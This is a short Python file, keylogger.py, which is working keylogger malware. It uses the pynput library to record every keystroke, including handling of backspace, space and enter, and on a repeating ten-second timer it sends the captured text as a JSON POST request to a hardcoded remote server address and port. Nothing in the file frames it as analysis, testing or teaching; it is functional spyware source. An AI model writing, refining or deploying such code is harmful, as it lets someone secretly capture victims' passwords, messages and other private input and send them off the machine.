# keylogger.py

from pynput import keyboard
import requests
import json
import threading

# Global variable to store keystrokes
text = ""

# Hardcode the IP address and port number of your server
ip_address = "192.168.1.107"
port_number = "3000"
# Time interval in seconds to send data
time_interval = 10

def send_post_req():
    global text
    try:
        # Convert keystrokes to JSON and send to server
        payload = json.dumps({"keyboardData": text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
        print(f"Sent data to server: {payload}")  # Print confirmation for debugging

        # Reset the text after sending
        text = ""

        # Set up the timer to call send_post_req again
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request! Error: {e}")

# Handle key press events
def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace:
        if len(text) > 0:
            text = text[:-1]
    elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

# Start the keyboard listener and send the first POST request
with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
